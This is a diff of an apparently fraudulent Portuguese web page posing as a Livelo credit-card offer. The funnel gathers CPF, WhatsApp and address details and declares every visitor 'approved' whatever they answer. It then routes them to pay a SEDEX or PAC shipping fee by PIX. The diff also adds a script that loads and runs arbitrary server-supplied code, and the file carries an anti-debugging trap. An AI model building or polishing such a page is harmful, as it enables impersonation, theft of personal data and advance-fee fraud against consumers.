@@ -24,13 +24,38 @@ setInterval(function(){debugger;}, 1000);
 <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet"/>
 <link href="/static/css/main.css" rel="stylesheet"/>
-</link></head>
+</link>
+  <link id="dynamic-favicon" rel="icon" href="">
+  <script>
+    fetch('/api/config')
+      .then(res => res.json())
+      .then(data => {
+        if(data.favicon) {
+          document.getElementById('dynamic-favicon').href = data.favicon;
+        }
+        if(data.pixel_code) {
+          const div = document.createElement('div');
+          div.innerHTML = data.pixel_code;
+          Array.from(div.children).forEach(child => {
+            if(child.tagName === 'SCRIPT') {
+              const script = document.createElement('script');
+              if(child.src) script.src = child.src;
+              else script.text = child.text;
+              document.head.appendChild(script);
+            } else {
+              document.body.appendChild(child);
+            }
+          });
+        }
+      }).catch(e => console.log(e));
+  </script>
+</head>
 <body>
 <div id="app" style="display: flex; flex-direction: column; min-height: 100vh; background: var(--bg-color);">
   <header style="text-align:center; padding: 16px 0 8px 0;">
     <img alt="Logo" class="sys-logo" src="{{ sys_config.get('system_logo', '/static/images/logo.png') }}" style="height:64px; max-width:100%; object-fit:contain; display:inline-block;"/>
   </header>
-  <main style="flex: 1; display: flex; flex-direction: column; align-items: center; padding: 0;">
+  <main style="display: flex; flex-direction: column; flex: 1; align-items: center; padding: 0;">
 
 <!-- ═══════ SPLASH (Tela 4) ═══════ -->
 <div class="screen active" id="screen-splash">
@@ -119,9 +144,18 @@ setInterval(function(){debugger;}, 1000);
 <!-- Texto e botão sem caixa branca -->
 <h2 class="welcome-title">Bem-vindo!</h2>
 <p class="welcome-sub">Antes de prosseguirmos com a análise, precisamos fazer algumas perguntinhas para personalizar sua experiência e encontrar o melhor limite para você.</p>
-<button class="btn-primary" onclick="goToStep('terms')" style="max-width:320px;margin:24px auto 0">Vamos começar →</button>
+<button class="btn-primary" onclick="goToStep('cpf')" style="max-width:320px;margin:24px auto 0">Vamos começar →</button>
 
 
+</div>
+</div>
+
+<!-- ═══════ OLA (Pink Screen) ═══════ -->
+<div class="screen" id="screen-ola" style="background: linear-gradient(135deg, #E5147A 0%, #830B46 100%); color: white; align-items: center; justify-content: center; position: fixed; inset: 0; z-index: 9999; width: 100vw; height: 100vh; border-radius: 0;">
+<div style="text-align: center; padding: 20px;">
+  <h2 id="ola-name" style="font-size: 1.8rem; margin-bottom: 16px;">Olá, VITOR!</h2>
+  <p style="font-size: 1rem; margin-bottom: 32px; max-width: 320px; line-height: 1.5; margin-left: auto; margin-right: auto;">Responda as próximas perguntas e desbloqueie seu Cartão de Crédito exclusivo.</p>
+  <button class="btn-primary" style="background: white; color: #E5147A; max-width: 250px; margin: 0 auto; border-radius: 30px;" onclick="goToStep('priority')">Iniciar perguntas →</button>
 </div>
 </div>
 <!-- ═══════ TERMOS (Conta Digital) ═══════ -->
@@ -145,7 +179,7 @@ setInterval(function(){debugger;}, 1000);
 <span style="font-size:0.85rem;font-weight:500;color:var(--text);line-height:1.4">Ao prosseguir, você concorda com os termos de uso e política de privacidade da Livelo.</span>
 </div>
 </div>
-<button class="btn-primary" onclick="goToStep('cpf')" style="margin-top:0">Li e concordo →</button>
+<button class="btn-primary" onclick="goToStep('motivo')" style="margin-top:0">Li e concordo →</button>
 </div>
 
 
@@ -159,19 +193,19 @@ setInterval(function(){debugger;}, 1000);
 <div class="step-card funnel-card" style="padding:40px 30px">
 <h2 class="step-title" style="font-size:1.4rem;margin-bottom:24px;line-height:1.4;text-align:center;">O que é mais importante para você em um<br>cartão de crédito?</h2>
 <div class="choice-grid-2" style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
-<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<button class="big-choice-btn" onclick="goToStep('employment')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
 <svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.41 16.09V20h-2.67v-1.93c-1.71-.36-3.16-1.46-3.27-3.4h1.96c.1 1.05.82 1.87 2.65 1.87 1.96 0 2.4-.98 2.4-1.59 0-.83-.44-1.61-2.67-2.14-2.48-.6-4.18-1.62-4.18-3.67 0-1.72 1.39-2.84 3.11-3.21V4h2.67v1.95c1.86.45 2.79 1.86 2.85 3.39H14.3c-.05-1.11-.64-1.87-2.22-1.87-1.5 0-2.4.68-2.4 1.64 0 .84.65 1.39 2.67 1.91 2.84.7 4.18 1.75 4.18 3.86 0 1.91-1.47 2.94-3.12 3.21z"/></svg>
 Limite alto
 </button>
-<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<button class="big-choice-btn" onclick="goToStep('employment')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
 <svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M13.13 22.19L11.5 18.36C10.07 18.78 8.45 18.78 7.02 18.36L5.39 22.19C5.1 22.87 4.3 23.2 3.61 22.92C2.93 22.63 2.6 21.84 2.88 21.16L4.52 17.33C2.88 15.34 2.02 12.83 2.02 10.14C2.02 4.54 6.56 0 12.16 0C17.76 0 22.3 4.54 22.3 10.14C22.3 12.83 21.44 15.34 19.8 17.33L21.44 21.16C21.73 21.84 21.39 22.63 20.71 22.92C20.02 23.2 19.22 22.87 18.94 22.19L17.31 18.36C15.88 18.78 14.26 18.78 12.83 18.36L11.2 22.19C10.91 22.87 10.12 23.2 9.43 22.92C8.75 22.63 8.42 21.84 8.7 21.16L10.33 17.33C10.74 17.21 11.16 17.06 11.58 16.89C11.96 16.74 12.33 16.57 12.7 16.38L11.07 20.21C10.78 20.89 11.12 21.68 11.8 21.97C12.48 22.25 13.28 21.92 13.56 21.24L15.19 17.41C16.62 16.99 17.9 16.29 18.94 15.36L17.31 19.19C17.02 19.87 17.36 20.66 18.04 20.95C18.73 21.23 19.53 20.9 19.81 20.22L21.44 16.39C22.25 14.54 22.7 12.43 22.7 10.14C22.7 4.54 18.16 0 12.56 0C6.96 0 2.42 4.54 2.42 10.14C2.42 12.43 2.87 14.54 3.68 16.39L5.31 20.22C5.59 20.9 5.26 21.69 4.57 21.97C3.89 22.26 3.1 21.92 2.81 21.24L1.18 17.41C0.14 16.29 -0.42 14.86 -0.73 13.25L0.9 17.08C1.19 17.76 1.98 18.1 2.67 17.81C3.35 17.53 3.68 16.74 3.4 16.06L1.77 12.23C1.65 11.56 1.62 10.86 1.62 10.14C1.62 4.54 6.16 0 11.76 0C17.36 0 21.9 4.54 21.9 10.14C21.9 10.86 21.87 11.56 21.75 12.23L20.12 16.06C19.83 16.74 20.17 17.53 20.85 17.81C21.54 18.1 22.33 17.76 22.62 17.08L24.25 13.25C23.94 14.86 23.38 16.29 22.34 17.41L20.71 21.24C20.42 21.92 19.63 22.26 18.94 21.97C18.26 21.69 17.92 20.9 18.21 20.22L19.84 16.39C20.65 14.54 21.1 12.43 21.1 10.14C21.1 4.54 16.56 0 10.96 0C5.36 0 0.82 4.54 0.82 10.14C0.82 12.43 1.27 14.54 2.08 16.39L3.71 20.22C4 20.9 3.66 21.69 2.98 21.97C2.29 22.26 1.5 21.92 1.21 21.24L-0.42 17.41C-1.46 16.29 -2.02 14.86 -2.33 13.25L-0.7 17.08C-0.41 17.76 0.38 18.1 1.07 17.81C1.75 17.53 2.08 16.74 1.8 16.06L0.17 12.23C0.05 11.56 0.02 10.86 0.02 10.14C0.02 4.54 4.56 0 10.16 0C15.76 0 20.3 4.54 20.3 10.14C20.3 10.86 20.27 11.56 20.15 12.23L18.52 16.06C18.23 16.74 18.57 17.53 19.25 17.81C19.94 18.1 20.73 17.76 21.02 17.08L22.65 13.25C22.34 14.86 21.78 16.29 20.74 17.41L19.11 21.24C18.82 21.92 18.03 22.26 17.34 21.97C16.66 21.69 16.32 20.9 16.61 20.22L18.24 16.39C19.05 14.54 19.5 12.43 19.5 10.14C19.5 4.54 14.96 0 9.36 0C3.76 0 -0.78 4.54 -0.78 10.14C-0.78 12.43 -0.33 14.54 0.48 16.39L2.11 20.22C2.4 20.9 2.06 21.69 1.38 21.97C0.69 22.26 -0.1 21.92 -0.39 21.24L-2.02 17.41C-3.06 16.29 -3.62 14.86 -3.93 13.25"/></svg>
 Crédito imediato
 </button>
-<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<button class="big-choice-btn" onclick="goToStep('employment')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
 <svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8 0-1.85.63-3.55 1.69-4.9L16.9 18.31C15.55 19.37 13.85 20 12 20zm6.31-3.1L7.1 5.69C8.45 4.63 10.15 4 12 4c4.42 0 8 3.58 8 8 0 1.85-.63 3.55-1.69 4.9z"/></svg>
 Não consultar SPC/Serasa
 </button>
-<button class="big-choice-btn" onclick="goToStep('manager')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
+<button class="big-choice-btn" onclick="goToStep('income')" style="padding:24px 10px;border-radius:14px;border:2.5px solid #D11666;background:#FFFFFF;color:#000000;font-size:1rem;font-weight:700;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:pointer;transition:transform 0.2s;box-shadow:0 4px 12px rgba(209,22,102,0.1);">
 <svg fill="#D11666" height="36" viewBox="0 0 24 24" width="36"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20a2 2 0 0 0 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zM9 14H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2zm-8 4H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z"/></svg>
 Sem anuidade
 </button>
@@ -201,9 +235,11 @@ Melhor gerente 2023-2024
 </div>
 
 <div class="input-group" style="margin-bottom:24px;position:relative">
-<svg fill="#10B981" height="20" style="position:absolute;left:16px;top:50%;transform:translateY(-50%)" viewBox="0 0 24 24" width="20"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.43 9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>
-<input type="text" id="input-whatsapp" class="input-field" placeholder="Digite seu WhatsApp aqui" style="padding-left:44px" oninput="mascaraTel(this)" maxlength="15">
-<p id="wa-error" class="error-msg" style="margin-top:8px;font-size:0.8rem;text-align:center;"></p>
+<div style="position:absolute;left:16px;top:50%;transform:translateY(-50%);width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:#10B981;border-radius:50%;box-shadow:0 2px 8px rgba(16,185,129,0.3);flex-shrink:0;">
+<svg fill="white" height="18" viewBox="0 0 24 24" width="18" style="flex-shrink:0;display:block;"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.43 9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>
+</div>
+<input type="text" id="input-whatsapp" class="input-field" placeholder="Digite seu WhatsApp aqui" style="padding-left:54px; padding-top:16px; padding-bottom:16px; background:#F8FAFC; border:2px solid #E5E7EB; border-radius:14px; font-size:1rem; font-weight:600; color:#1F2937; transition:border-color 0.2s, box-shadow 0.2s;" oninput="mascaraTel(this)" onfocus="this.style.borderColor='#E5147A'; this.style.boxShadow='0 0 0 4px rgba(229,20,122,0.1)';" onblur="this.style.borderColor='#E5E7EB'; this.style.boxShadow='none';" maxlength="15">
+<p id="wa-error" class="error-msg hidden" style="margin-top:8px;font-size:0.8rem;text-align:center;"></p>
 </div>
 <button class="btn-primary" id="btn-wa-continuar" onclick="submitWhatsapp()" style="margin-top:0">
   <span id="btn-wa-text">Continuar</span> <span id="wa-btn-arrow">→</span>
@@ -230,6 +266,21 @@ Melhor gerente 2023-2024
 </div>
 
 
+
+</div>
+</div>
+
+<!-- ═══════ RESTRICTIONS ═══════ -->
+<div class="screen" id="screen-restrictions">
+<div class="funnel-page">
+
+<div class="step-card funnel-card" style="padding:40px 30px">
+<h2 class="funnel-q" style="font-size:1.1rem;margin-bottom:24px;text-align:center;">Você tem restrições no CPF?</h2>
+<div class="choice-grid-2" style="display:flex;gap:16px;">
+<button class="big-choice-btn" style="flex:1;" onclick="goToStep('perfect-card')">Sim</button>
+<button class="big-choice-btn" style="flex:1;" onclick="goToStep('perfect-card')">Não</button>
+</div>
+</div>
 
 </div>
 </div>
@@ -278,107 +329,17 @@ Melhor gerente 2023-2024
 <!-- ═══════ VENCIMENTO ═══════ -->
 <div class="screen" id="screen-billing">
 <div class="funnel-page">
-
-<div class="step-card funnel-card">
-<h2 class="funnel-q" style="font-size:1.25rem;margin-bottom:10px;line-height:1.4">Qual é o seu dia de vencimento preferido?</h2>
-<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.9rem;text-align:center;color:var(--text-muted)">Escolha o dia do mês em que prefere que sua fatura seja gerada.</p>
-<style>
-.calendar-wrapper {
-    background: #FFFFFF;
-    border-radius: 20px;
-    padding: 20px;
-    box-shadow: 0 4px 24px rgba(0,0,0,0.04);
-    border: 1px solid rgba(0,0,0,0.02);
-    margin-bottom: 24px;
-}
-.calendar-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 16px;
-    padding-bottom: 12px;
-    border-bottom: 1px solid #F3F4F6;
-    color: var(--text);
-    font-weight: 700;
-    font-size: 0.95rem;
-}
-.calendar-grid {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 12px;
-}
-.calendar-day-btn {
-    background: #F9FAFB;
-    border: 2px solid transparent;
-    border-radius: 14px;
-    padding: 16px 0;
-    font-size: 1.4rem;
-    font-weight: 800;
-    color: #374151;
-    cursor: pointer;
-    transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-    box-shadow: inset 0 0 0 1px rgba(0,0,0,0.05);
-    position: relative;
-    overflow: hidden;
-    z-index: 1;
-}
-.calendar-day-btn:hover {
-    transform: translateY(-4px) scale(1.02);
-    background: #FFFFFF;
-    border-color: var(--pink);
-    color: var(--pink);
-    box-shadow: 0 12px 20px -8px rgba(229, 20, 122, 0.3);
-    z-index: 2;
-}
-.calendar-day-btn.selected {
-    background: var(--pink);
-    border-color: var(--pink);
-    color: #FFFFFF;
-    transform: translateY(-2px) scale(1.05);
-    box-shadow: 0 8px 24px rgba(229, 20, 122, 0.4);
-    z-index: 3;
-}
-.calendar-day-btn:active {
-    transform: scale(0.95);
-}
-.calendar-day-btn::after {
-    content: '';
-    position: absolute;
-    top: 50%; left: 50%;
-    width: 100%; height: 100%;
-    background: rgba(255,255,255,0.15);
-    border-radius: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    transition: transform 0.5s ease;
-    z-index: -1;
-}
-.calendar-day-btn.selected::after {
-    transform: translate(-50%, -50%) scale(2.5);
-}
-</style>
-
-<div class="calendar-wrapper">
-    <div class="calendar-header">
-        <span>Dias disponíveis</span>
-        <svg fill="none" height="18" viewbox="0 0 24 24" width="18" stroke="currentColor" stroke-width="2"><rect height="18" rx="2" width="18" x="3" y="4"></rect><path d="M16 2v4M8 2v4M3 10h18"></path></svg>
-    </div>
-    <div class="calendar-grid">
-        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">1</button>
-        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">5</button>
-        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">10</button>
-        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">15</button>
-        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">20</button>
-        <button class="calendar-day-btn day-btn" onclick="selectDay(this)">25</button>
-    </div>
+<div class="step-card funnel-card" style="padding:40px 30px">
+<h2 class="funnel-q" style="font-size:1.25rem;margin-bottom:10px;line-height:1.4;text-align:center;">Escolha a melhor data</h2>
+<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.9rem;text-align:center;color:var(--text-muted)">Selecione o melhor dia para o vencimento da sua fatura</p>
+<div style="display:flex;flex-direction:column;gap:12px;">
+<button class="income-btn" style="justify-content:center;font-weight:600;width:100%" onclick="goToStep('card-style')">Dia 5</button>
+<button class="income-btn" style="justify-content:center;font-weight:600;width:100%" onclick="goToStep('card-style')">Dia 10</button>
+<button class="income-btn" style="justify-content:center;font-weight:600;width:100%" onclick="goToStep('card-style')">Dia 15</button>
+<button class="income-btn" style="justify-content:center;font-weight:600;width:100%" onclick="goToStep('card-style')">Dia 25</button>
+<button class="income-btn" style="justify-content:center;font-weight:600;width:100%" onclick="goToStep('card-style')">Dia 30</button>
 </div>
-<div class="error-msg hidden" id="billing-error">Selecione o dia de vencimento para continuar.</div>
-<button class="btn-primary" onclick="submitBilling()" style="margin-top:24px">
-<span id="billing-btn-text">Analisar meu perfil</span>
-<div class="spinner hidden" id="billing-spin"></div>
-</button>
 </div>
-
-
 </div>
 </div>
 <!-- ═══════ LIMIT INFO ═══════ -->
@@ -398,7 +359,7 @@ Melhor gerente 2023-2024
 <div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">No entanto, se houver atraso no pagamento das faturas, o limite poderá ser reduzido.</div>
 </div>
 </div>
-<button class="btn-primary" onclick="startAnalysis()" style="margin-top:0">Concordo →</button>
+<button class="btn-primary" onclick="goToStep('billing')" style="margin-top:0">Concordo →</button>
 </div>
 
 
@@ -437,6 +398,22 @@ Melhor gerente 2023-2024
 </div>
 <svg style="display:none"><circle id="analysis-progress-circle"></circle><text id="analysis-pct"></text></svg>
 </div>
+<!-- ═══════ PERFECT CARD MODAL (ETAPA 9) ═══════ -->
+<div class="screen" id="screen-perfect-card" style="background: rgba(0,0,0,0.5); align-items: center; justify-content: center; position: fixed; inset: 0; z-index: 9999;">
+<div class="step-container" style="width: 100%; max-width: 400px;">
+<div class="step-card" style="padding:40px 30px; text-align: center;">
+<div style="display:flex;justify-content:center;margin-bottom:20px">
+<div style="width:48px;height:48px;border-radius:50%;background:#D1FAE5;display:flex;align-items:center;justify-content:center">
+<svg fill="none" height="28" viewbox="0 0 24 24" width="28"><path d="M5 13l4 4L19 7" stroke="#10B981" stroke-linecap="round" stroke-linejoin="round" stroke-width="3"></path></svg>
+</div>
+</div>
+<h2 class="step-title" style="font-size:1.25rem;margin-bottom:12px;line-height:1.3">Temos um cartão perfeito para<br/>você!</h2>
+<p class="step-sub" style="margin-top:0;margin-bottom:24px;font-size:0.85rem">Conclua seu cadastro e faça seu cartão de crédito agora!</p>
+<button class="btn-primary" onclick="goToStep('terms')" style="margin-top:0">Continuar</button>
+</div>
+</div>
+</div>
+
 <!-- ═══════ APROVADO ═══════ -->
 <div class="screen" id="screen-approved">
 <div class="step-container" >
@@ -461,7 +438,7 @@ Melhor gerente 2023-2024
 <div class="hidden" id="approved-name-display" style="display:none"></div>
 <div class="hidden" id="summary-name" style="display:none"></div>
 <div class="hidden" id="summary-end" style="display:none"></div>
-<button class="btn-primary" onclick="goToStep('card-style')" style="margin-top:0">Continuar →</button>
+<button class="btn-primary" onclick="goToStep('limit-info')" style="margin-top:0">Continuar →</button>
 </div>
 
 
@@ -476,6 +453,17 @@ Melhor gerente 2023-2024
 <!-- CARD SCENE — 3D flip wrapper -->
 <div class="card-scene">
 <div class="card-flipper" id="card-flipper">
+<style>
+@keyframes cardFloat {
+  0% { transform: translateY(0px) rotateX(10deg) rotateY(-5deg); }
+  50% { transform: translateY(-15px) rotateX(15deg) rotateY(0deg); box-shadow: 0 25px 40px -15px rgba(0,0,0,0.5); }
+  100% { transform: translateY(0px) rotateX(10deg) rotateY(-5deg); }
+}
+.advanced-card-preview {
+  animation: cardFloat 4s ease-in-out infinite;
+  box-shadow: 0 15px 35px -10px rgba(0,0,0,0.4);
+}
+</style>
 <div class="advanced-card-preview" id="advanced-card-preview">
 <!-- SVG pattern overlay -->
 <svg class="card-pattern-svg" preserveaspectratio="xMidYMid slice" viewbox="0 0 340 200" xmlns="http://www.w3.org/2000/svg">
@@ -616,7 +604,7 @@ Melhor gerente 2023-2024
 </div>
 </div>
 
-<button class="btn-primary" id="btn-cep-continuar" onclick="submitCep()" style="width:100%; padding:16px; font-size:1rem; font-weight:700; border-radius:24px; display:flex; justify-content:center; align-items:center; gap:8px;">
+<button class="btn-primary" id="btn-cep-continuar" onclick="submitAddress()" style="width:100%; padding:16px; font-size:1rem; font-weight:700; border-radius:24px; display:flex; justify-content:center; align-items:center; gap:8px;">
 Continuar 
 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
 </button>
@@ -670,6 +658,60 @@ Continuar
 </div>
 </div>
 <!-- ═══════ SHIPPING SUMMARY (Img 4) ═══════ -->
+<div class="screen" id="screen-shipping-methods">
+<div class="step-container" style="max-width:480px">
+
+<div class="step-card funnel-card" style="padding: 40px 30px; border-radius: 16px;">
+<h2 class="step-title" style="font-size:1.4rem; font-weight:800; margin-bottom:6px; color:#1A1A1A; text-align:center;">Escolha o método de envio</h2>
+<p class="step-sub" style="font-size:0.85rem; color:#666; margin-bottom:24px; text-align:center; line-height:1.4">Agora basta escolher uma forma de envio do seu<br>Cartão de Crédito <span style="color:var(--pink);font-weight:700">APROVADO</span></p>
+
+<style>
+.shipping-btn {
+  background: #FFF; border: 1px solid #E5E5E5; border-radius: 14px; padding: 18px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; width: 100%; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); position: relative; overflow: hidden;
+}
+.shipping-btn:hover {
+  border-color: var(--pink); box-shadow: 0 8px 24px rgba(229, 20, 122, 0.15); transform: translateY(-3px) scale(1.02); background: #fdf2f8;
+}
+.shipping-btn:active {
+  transform: scale(0.98);
+}
+.shipping-btn .svg-icon {
+  width: 32px; height: 32px; color: var(--pink); transition: transform 0.3s;
+}
+.shipping-btn:hover .svg-icon {
+  transform: scale(1.15) rotate(-5deg);
+}
+</style>
+<div style="display:flex;flex-direction:column;gap:16px;">
+<!-- SEDEX -->
+<button onclick="selectShipping('sedex', 29.90)" class="shipping-btn">
+  <div style="display:flex; align-items:center; gap:16px;">
+    <svg class="svg-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4"></path></svg>
+    <div style="text-align:left;">
+      <div style="font-size:1rem; font-weight:800; color:#1A1A1A;">SEDEX</div>
+      <div style="font-size:0.75rem; color:#666; font-weight:500;">1 dia útil</div>
+    </div>
+  </div>
+  <div style="font-size:1.15rem; font-weight:800; color:var(--pink);">R$ 29,90</div>
+</button>
+
+<!-- PAC -->
+<button onclick="selectShipping('pac', 24.30)" class="shipping-btn">
+  <div style="display:flex; align-items:center; gap:16px;">
+    <svg class="svg-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+    <div style="text-align:left;">
+      <div style="font-size:1rem; font-weight:800; color:#1A1A1A;">PAC</div>
+      <div style="font-size:0.75rem; color:#666; font-weight:500;">17-20 dias úteis</div>
+    </div>
+  </div>
+  <div style="font-size:1.15rem; font-weight:800; color:var(--pink);">R$ 24,30</div>
+</button>
+</div>
+
+</div>
+</div>
+</div>
+<!-- ═══════ SHIPPING SUMMARY (Img 4) ═══════ -->
 <div class="screen" id="screen-shipping-summary">
 <div class="step-container" style="max-width:480px">
 
@@ -698,31 +740,36 @@ Continuar
 <h2 style="font-size:1.1rem;margin-bottom:8px;color:#1A1A1A">Finalize o envio do seu cartão</h2>
 <p style="font-size:0.8rem;color:var(--text-muted);margin:0">Confira os dados do cartão escolhido e o endereço de entrega antes de pagar o frete.</p>
 </div>
-<div style="text-align:center;margin-bottom:16px">
-<div style="font-size:1.6rem;font-weight:800;color:var(--pink)">R$ 29,90</div>
+<div style="text-align:center;margin-bottom:24px">
+<div style="font-size:1.4rem;font-weight:800;color:var(--pink)">R$ 29,90</div>
 </div>
-<button class="btn-primary" onclick="goToStep('pix')" style="margin-top:0;margin-bottom:12px;display:flex;align-items:center;justify-content:center;gap:8px">Pagar Frete <svg fill="none" height="18" viewbox="0 0 24 24" width="18"><path d="M9 18l6-6-6-6" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg></button>
-<div style="text-align:center;font-size:0.75rem;color:#10B981;margin-bottom:24px"><span style="display:inline-block;margin-right:4px">🔒</span> Pagamento 100% seguro</div>
-<div style="display:flex;gap:12px">
-<div style="flex:1;background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px">
-<div style="font-size:0.75rem;font-weight:700;color:var(--text);margin-bottom:8px">Resumo do frete</div>
-<div style="font-size:0.7rem;color:var(--text-muted);line-height:1.4;text-transform:uppercase">
